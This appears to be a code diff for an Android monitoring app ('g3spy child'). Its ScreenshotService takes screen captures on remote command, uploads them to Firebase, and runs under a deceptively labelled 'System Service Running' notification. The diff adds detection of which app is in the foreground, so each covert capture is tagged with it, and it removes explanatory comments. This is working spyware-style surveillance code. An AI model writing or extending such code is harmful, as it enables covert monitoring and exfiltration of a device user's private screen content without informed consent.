@@ -1,6 +1,8 @@
 package com.g3spy.child.services
 
 import android.app.*
+import android.app.usage.UsageEvents
+import android.app.usage.UsageStatsManager
 import android.content.Context
 import android.content.Intent
 import android.content.SharedPreferences
@@ -28,12 +30,10 @@ import java.io.ByteArrayOutputStream
 import java.io.File
 import java.io.FileOutputStream
 import java.io.IOException
+import java.net.URISyntaxException
 import java.util.*
 import java.util.concurrent.Executors
 
-/**
- * Service that takes screenshots and uploads them to Firebase Storage
- */
 class ScreenshotService : Service() {
     companion object {
         private const val TAG = "ScreenshotService"
@@ -50,7 +50,6 @@ class ScreenshotService : Service() {
     private lateinit var prefs: SharedPreferences
     private var commandListener: ListenerRegistration? = null
     
-    // Media projection variables
     private var mediaProjection: MediaProjection? = null
     private var imageReader: ImageReader? = null
     private var virtualDisplay: VirtualDisplay? = null
@@ -58,7 +57,6 @@ class ScreenshotService : Service() {
     private var displayHeight = 0
     private var displayDensity = 0
     
-    // Executor for background tasks
     private val executor = Executors.newSingleThreadExecutor()
     
     private val binder = LocalBinder()
@@ -74,7 +72,6 @@ class ScreenshotService : Service() {
         storage = FirebaseStorage.getInstance()
         prefs = getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
         
-        // Get display metrics
         val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
         val metrics = DisplayMetrics()
         windowManager.defaultDisplay.getMetrics(metrics)
@@ -82,7 +79,6 @@ class ScreenshotService : Service() {
         displayHeight = metrics.heightPixels
         displayDensity = metrics.densityDpi
         
-        // Create the notification channel
         NotificationChannelManager.createNotificationChannel(
             this,
             CHANNEL_ID,
@@ -90,35 +86,30 @@ class ScreenshotService : Service() {
             NotificationManager.IMPORTANCE_LOW
         )
         
-        // Try to restore media projection
         restoreMediaProjection()
         
-        // Listen for commands
         listenForScreenshotCommands()
     }
     
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         Log.d(TAG, "ScreenshotService started")
         
-        // Save projection data if provided
         if (intent?.hasExtra("resultCode") == true && intent.hasExtra("data")) {
             val resultCode = intent.getIntExtra("resultCode", Activity.RESULT_CANCELED)
             val data = intent.getParcelableExtra<Intent>("data")
             
             if (resultCode != Activity.RESULT_CANCELED && data != null) {
-                // Save for later restoration
+                
                 with(prefs.edit()) {
                     putInt(PROJECTION_RESULT_CODE, resultCode)
                     putString(PROJECTION_INTENT_DATA, data.toUri(0))
                     apply()
                 }
                 
-                // Initialize projection
                 initializeMediaProjection(resultCode, data)
             }
         }
         
-        // Create a notification for the foreground service
         val notification = createNotification()
         startForeground(NOTIFICATION_ID, notification)
         
@@ -137,7 +128,7 @@ class ScreenshotService : Service() {
     }
     
     private fun createNotification(): Notification {
-        // Create an intent that will open the app when tapped
+        
         val notificationIntent = Intent(this, this::class.java)
         val pendingIntent = PendingIntent.getActivity(
             this,
@@ -146,7 +137,6 @@ class ScreenshotService : Service() {
             PendingIntent.FLAG_IMMUTABLE
         )
         
-        // Build the notification
         return NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("System Service Running")
             .setContentText("Maintaining system services...")
@@ -160,10 +150,17 @@ class ScreenshotService : Service() {
         val resultCode = prefs.getInt(PROJECTION_RESULT_CODE, Activity.RESULT_CANCELED)
         val dataString = prefs.getString(PROJECTION_INTENT_DATA, null)
         
-        if (resultCode != Activity.RESULT_CANCELED && dataString != null) {
+        if (resultCode != Activity.RESULT_CANCELED && dataString != null && dataString.isNotBlank()) {
             try {
+                if (!dataString.startsWith("intent:") && !dataString.startsWith("android-app:")) {
+                    Log.e(TAG, "Invalid URI scheme: $dataString")
+                    return
+                }
+                
                 val data = Intent.parseUri(dataString, 0)
                 initializeMediaProjection(resultCode, data)
+            } catch (e: URISyntaxException) {
+                Log.e(TAG, "Invalid URI syntax: $dataString", e)
             } catch (e: Exception) {
                 Log.e(TAG, "Failed to restore media projection", e)
             }
@@ -175,7 +172,7 @@ class ScreenshotService : Service() {
         mediaProjection = projectionManager.getMediaProjection(resultCode, data)
         
         mediaProjection?.let { projection ->
-            // Create an ImageReader to capture screenshots
+            
             imageReader = ImageReader.newInstance(
                 displayWidth,
                 displayHeight,
@@ -188,7 +185,6 @@ class ScreenshotService : Service() {
                 }, null)
             }
             
-            // Create a virtual display to capture the screen
             virtualDisplay = projection.createVirtualDisplay(
                 "ScreenshotDisplay",
                 displayWidth,
@@ -230,10 +226,9 @@ class ScreenshotService : Service() {
                     val command = change.document
                     Log.d(TAG, "Received screenshot command: ${command.id}")
                     
-                    // Take a screenshot
                     takeScreenshot { success ->
                         if (success) {
-                            // Mark the command as executed
+                            
                             command.reference.update("isExecuted", true)
                         }
                     }
@@ -248,13 +243,12 @@ class ScreenshotService : Service() {
             return
         }
         
-        // Trigger a capture by invalidating the virtual display
         virtualDisplay?.let {
             Handler(Looper.getMainLooper()).postDelayed({
                 Log.d(TAG, "Taking screenshot")
-                // The callback will be called by the ImageReader's onImageAvailableListener
+                
                 callback(true)
-            }, 500) // Slight delay to ensure the display is ready
+            }, 500) 
         } ?: run {
             Log.e(TAG, "Virtual display not initialized")
             callback(false)
@@ -274,20 +268,28 @@ class ScreenshotService : Service() {
                 val rowStride = image.planes[0].rowStride
                 val rowPadding = rowStride - pixelStride * displayWidth
                 
-                // Create bitmap
+                if (pixelStride <= 0 || rowStride <= 0 || rowPadding < 0) {
+                    Log.e(TAG, "Invalid stride values: pixelStride=$pixelStride, rowStride=$rowStride, rowPadding=$rowPadding")
+                    return@execute
+                }
+                
+                val bitmapWidth = displayWidth + rowPadding / pixelStride
+                if (bitmapWidth <= 0 || displayHeight <= 0) {
+                    Log.e(TAG, "Invalid bitmap dimensions: width=$bitmapWidth, height=$displayHeight")
+                    return@execute
+                }
+                
                 bitmap = Bitmap.createBitmap(
-                    displayWidth + rowPadding / pixelStride,
+                    bitmapWidth,
                     displayHeight,
                     Bitmap.Config.ARGB_8888
                 )
                 bitmap.copyPixelsFromBuffer(buffer)
                 
-                // Create a temporary file
                 tempFile = File.createTempFile("screenshot", ".jpg", cacheDir)
                 fileOutputStream = FileOutputStream(tempFile)
                 bitmap.compress(Bitmap.CompressFormat.JPEG, 85, fileOutputStream)
                 
-                // Upload to Firebase
                 uploadScreenshot(tempFile)
             } catch (e: Exception) {
                 Log.e(TAG, "Failed to process image", e)
@@ -304,21 +306,50 @@ class ScreenshotService : Service() {
         }
     }
     
+    private fun getForegroundApp(): String {
+        return try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                val usageStatsManager = getSystemService(Context.USAGE_STATS_SERVICE) as? UsageStatsManager
+                if (usageStatsManager != null) {
+                    val currentTime = System.currentTimeMillis()
+                    val usageEvents = usageStatsManager.queryEvents(currentTime - 1000 * 10, currentTime)
+                    
+                    var lastEvent: UsageEvents.Event? = null
+                    while (usageEvents.hasNextEvent()) {
+                        val event = UsageEvents.Event()
+                        usageEvents.getNextEvent(event)
+                        
+                        if (event.eventType == UsageEvents.Event.MOVE_TO_FOREGROUND) {
+                            lastEvent = event
+                        }
+                    }
+                    
+                    lastEvent?.packageName ?: "Unknown"
+                } else {
+                    "Unknown"
+                }
+            } else {
+                "Unknown"
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to get foreground app", e)
+            "Unknown"
+        }
+    }
+    
     private fun uploadScreenshot(file: File) {
-        // Get the currently active app
-        val appInForeground = "Unknown" // In a real app, would get actual foreground app
         
-        // Create a reference to Firebase Storage
+        val appInForeground = getForegroundApp()
+        
         val timestamp = System.currentTimeMillis()
         val filename = "screenshot_${timestamp}.jpg"
         val storageRef = storage.reference.child("screenshots/$filename")
         
-        // Upload the file
         val uploadTask = storageRef.putFile(Uri.fromFile(file))
         uploadTask.addOnSuccessListener {
-            // Get the download URL
+            
             storageRef.downloadUrl.addOnSuccessListener { uri ->
-                // Save the screenshot metadata to Firestore
+                
                 val screenshotData = hashMapOf(
                     "imageUrl" to uri.toString(),
                     "timestamp" to Timestamp.now(),
@@ -330,7 +361,6 @@ class ScreenshotService : Service() {
                     .addOnSuccessListener { documentReference ->
                         Log.d(TAG, "Screenshot uploaded with ID: ${documentReference.id}")
                         
-                        // Clean up the temporary file
                         file.delete()
                     }
                     .addOnFailureListener { e ->
